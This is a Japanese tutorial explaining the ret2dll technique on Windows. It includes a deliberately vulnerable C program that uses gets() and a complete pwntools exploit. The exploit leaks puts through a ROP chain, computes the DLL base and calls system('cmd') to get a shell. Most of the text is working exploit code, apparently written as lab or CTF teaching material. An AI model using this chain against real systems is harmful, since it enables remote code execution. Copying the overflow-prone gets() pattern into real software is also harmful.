# ret2dll の利用

原理は Linux の ret2libc と似ていますが、アドレスを手動で取り出す必要があります。現時点では pwntools は exe ファイルのアドレスを取り出せません。
ソースコードは次のとおりです。
```
#include <stdio.h>
#include <ctype.h>
#define DEFAULT_LEN 16
int val(){
        char buff[DEFAULT_LEN] = {0};
        gets(buff);
}
int main(void)
{
        puts("start");
        fflush(stdout);
        val();
        fflush(stdout);
        puts("end");
        fflush(stdout);
}
```
Windows 上で gcc(MinGW-W64 x86_64-ucrt-posix-seh)を使ってコンパイルします。

`gcc "-Wl,--disable-reloc" -g -o ret2dll.exe ret2dll.c`


## 一時的な環境の構築

ncat を使う場合: `ncat -l 8080 --keep-open --exec ".\ret2dll.exe"`

win_server を使う場合: `win_server ./ret2dll.exe 8080`

exp は次のとおりです。
```python
from pwn import *

context.log_level='debug'
context.arch='amd64'
p=remote("192.168.0.190",8080)#ここは Windows の IP に置き換える
main_addr=0x14000155B#手動で入力したアドレス
ret_addr=0x1400015D7
puts_plt=0x140002868
puts_got=0x14000829C
rdi_addr=0x140002447
rcx_addr=0x140002750
#bp 0x140001554


payload  = b'a' * (0x10 +8)
payload += p64(rcx_addr)
payload += p64(puts_got)
payload += p64(puts_plt)

payload += p64(main_addr)
p.recvuntil("start")
p.sendline(payload)
puts_leak=u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b'\x00'))

print("leak addr:",hex(puts_leak))

puts_dll=0x11014E470
cmd_dll=0x0110179E48
sytem_dll=0x0110117E50

dll_base=puts_leak-puts_dll
# dll_base=0x7ffe71e00000
print("base addr:",hex(dll_base))

cmd_addr = dll_base +cmd_dll
system_addr=dll_base+sytem_dll
print("start attck")
payload  = b'a' * (0x10 + 8)
payload += p64(ret_addr)
payload += p64(rcx_addr)
payload += p64(cmd_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
```

実行結果は次のとおりです。

![ret2dll](./figure/ret2dll-1.png)
